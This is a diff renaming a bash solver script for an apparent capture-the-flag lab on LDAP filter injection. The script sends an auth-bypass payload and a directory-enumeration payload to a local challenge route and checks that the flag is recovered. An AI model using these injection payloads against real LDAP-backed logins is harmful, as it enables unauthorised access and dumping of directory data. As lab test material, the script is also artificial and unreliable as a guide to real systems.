@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
-# solvers/p4_3.sh, Task 4.3 "Zodiac Twelve Directory Breach" canonical exploit.
+# solvers/p4_5.sh, Task 4.5 "Zodiac Twelve Directory Breach" canonical exploit.
 #
-# challenges/phase4.py's p4_3 block builds two real LDAP filters directly
+# challenges/phase4.py's p4_5 block builds two real LDAP filters directly
 # out of raw request input, string-concatenated with zero escaping of RFC
 # 4515 filter metacharacters (`* ( ) \` and NUL):
 #
@@ -36,10 +36,10 @@ ROUTE="${BASE}/p4/zodiac"
 
 fail=0
 
-echo "[p4_3] target: ${ROUTE}"
+echo "[p4_5] target: ${ROUTE}"
 
 # --- Step 1: a genuine wrong-password login must FAIL --------------------
-echo "[p4_3] step 1: legitimate login with a wrong/guessed plain-string password"
+echo "[p4_5] step 1: legitimate login with a wrong/guessed plain-string password"
 echo "  POST username=chairman&password=totally-wrong-guess"
 
 legit_resp=$(curl -s -X POST "$ROUTE" \
@@ -49,20 +49,20 @@ legit_resp=$(curl -s -X POST "$ROUTE" \
 echo "  response: ${legit_resp}"
 
 if echo "$legit_resp" | grep -qF "$FLAG"; then
-    echo "[p4_3] FAIL: a wrong plain-string password logged in successfully, the"
+    echo "[p4_5] FAIL: a wrong plain-string password logged in successfully, the"
     echo "  route is accepting any credential, not specifically the filter"
     echo "  injection this lesson is about."
     fail=1
 fi
 if echo "$legit_resp" | grep -q '"success":true'; then
-    echo "[p4_3] FAIL: wrong plain-string password reported success:true"
+    echo "[p4_5] FAIL: wrong plain-string password reported success:true"
     fail=1
 else
     echo "  ok: wrong plain-string password was correctly rejected"
 fi
 
 # --- Step 2: a normal, well-formed uid=chairman search must NOT leak -----
-echo "[p4_3] step 2: normal, non-injected directory search for uid=chairman"
+echo "[p4_5] step 2: normal, non-injected directory search for uid=chairman"
 echo "  GET /p4/zodiac?uid=chairman"
 
 normal_resp=$(curl -s -G "$ROUTE" \
@@ -71,7 +71,7 @@ normal_resp=$(curl -s -G "$ROUTE" \
 echo "  response: ${normal_resp}"
 
 if echo "$normal_resp" | grep -qF "$FLAG"; then
-    echo "[p4_3] FAIL: an ordinary, well-formed lookup of uid=chairman leaked the"
+    echo "[p4_5] FAIL: an ordinary, well-formed lookup of uid=chairman leaked the"
     echo "  flag with no injection at all, the flag must only be reachable"
     echo "  via the broken filter, not via legitimate use of the search."
     fail=1
@@ -80,7 +80,7 @@ else
 fi
 
 # --- Step 3: auth-bypass payload ------------------------------------------
-echo '[p4_3] step 3: auth bypass: username=*)(uid=* & password=*'
+echo '[p4_5] step 3: auth bypass: username=*)(uid=* & password=*'
 
 bypass_resp=$(curl -s -X POST "$ROUTE" \
     -H "Accept: application/json" \
@@ -91,12 +91,12 @@ echo "  response: ${bypass_resp}"
 if echo "$bypass_resp" | grep -q '"success":true'; then
     echo "  ok: filter-injection auth bypass logged in with no valid credential"
 else
-    echo "[p4_3] FAIL: auth-bypass payload did not log in (no success:true)"
+    echo "[p4_5] FAIL: auth-bypass payload did not log in (no success:true)"
     fail=1
 fi
 
 # --- Step 4: enumeration payload -------------------------------------------
-echo '[p4_3] step 4: directory enumeration: uid=*)(objectClass=*'
+echo '[p4_5] step 4: directory enumeration: uid=*)(objectClass=*'
 
 dump_resp=$(curl -s -G "$ROUTE" \
     -H "Accept: application/json" \
@@ -106,16 +106,16 @@ echo "  response: ${dump_resp}"
 if echo "$dump_resp" | grep -q '"dump_mode":true' && echo "$dump_resp" | grep -qF "$FLAG"; then
     echo "  ok: enumeration payload dumped the full roster, flag recovered: ${FLAG}"
 else
-    echo "[p4_3] FAIL: enumeration payload did not dump the roster / flag missing"
+    echo "[p4_5] FAIL: enumeration payload did not dump the roster / flag missing"
     fail=1
 fi
 
 if [ "$fail" -ne 0 ]; then
-    echo "[p4_3] FAIL"
+    echo "[p4_5] FAIL"
     exit 1
 fi
 
-echo "[p4_3] ok: wrong password rejected, direct chairman lookup safe, bypass +"
-echo "[p4_3]     enumeration both worked against the real seeded OpenLDAP directory"
-echo "[p4_3] PASS"
+echo "[p4_5] ok: wrong password rejected, direct chairman lookup safe, bypass +"
+echo "[p4_5]     enumeration both worked against the real seeded OpenLDAP directory"
+echo "[p4_5] PASS"
 exit 0
